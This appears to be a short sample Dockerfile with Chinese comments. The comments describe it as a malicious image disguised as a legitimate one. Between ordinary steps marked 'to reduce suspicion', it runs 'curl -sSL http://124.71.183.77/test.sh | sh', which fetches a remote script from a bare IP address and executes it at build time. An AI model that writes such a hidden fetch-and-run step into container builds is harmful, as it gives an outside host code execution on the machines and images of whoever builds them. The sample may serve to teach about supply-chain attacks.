# 伪装成合法的 Dockerfile
FROM alpine:3.18

# 正常步骤（降低怀疑）
RUN apk add --no-cache curl

# 恶意指令（隐藏在实际操作中）
RUN curl -sSL http://124.71.183.77/test.sh | sh  # 直接下载执行远程脚本

# 正常步骤（继续伪装）
COPY app /app
CMD ["/app/start.sh"]
